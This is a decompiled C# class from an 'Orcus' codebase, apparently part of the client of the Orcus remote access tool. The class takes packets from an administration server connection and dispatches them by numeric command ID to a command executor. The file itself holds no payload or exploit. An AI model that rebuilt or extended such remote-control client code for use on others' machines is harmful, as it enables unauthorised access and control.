using System;
using Orcus.CommandManagement;
using Orcus.Plugins;
using Orcus.Shared.Communication;

namespace Orcus.Connection;

public class AdministrationConnection : IDisposable
{
	private readonly CommandSelector _commandSelector;

	private readonly ConnectionInfo _connectionInfo;

	public ushort Id { get; }

	public event EventHandler SendFailed;

	public AdministrationConnection(ushort id, ServerConnection connection, IClientInfo clientInfo)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		_commandSelector = new CommandSelector();
		_connectionInfo = new ConnectionInfo(connection, id, clientInfo, (IConnectionInitializer)_commandSelector.CommandDictionary[32u]);
		_connectionInfo.Failed += ConnectionInfoOnFailed;
		Id = id;
	}

	public void Dispose()
	{
		_commandSelector.Dispose();
	}

	public void PackageReceived(byte parameter, byte[] data, int index)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Invalid comparison between Unknown and I4
		SendingType val = (SendingType)parameter;
		if ((int)val == 2)
		{
			byte[] array = new byte[data.Length - index - 4];
			Array.Copy(data, index + 4, array, 0, array.Length);
			_commandSelector.ExecuteCommand(BitConverter.ToUInt32(data, index), array, _connectionInfo);
		}
	}

	public void SendPackage(byte[] package, ResponseType responseType)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		_connectionInfo.Response(package, responseType, (PackageCompression)0);
	}

	private void ConnectionInfoOnFailed(object sender, EventArgs e)
	{
		this.SendFailed?.Invoke(this, EventArgs.Empty);
	}
}
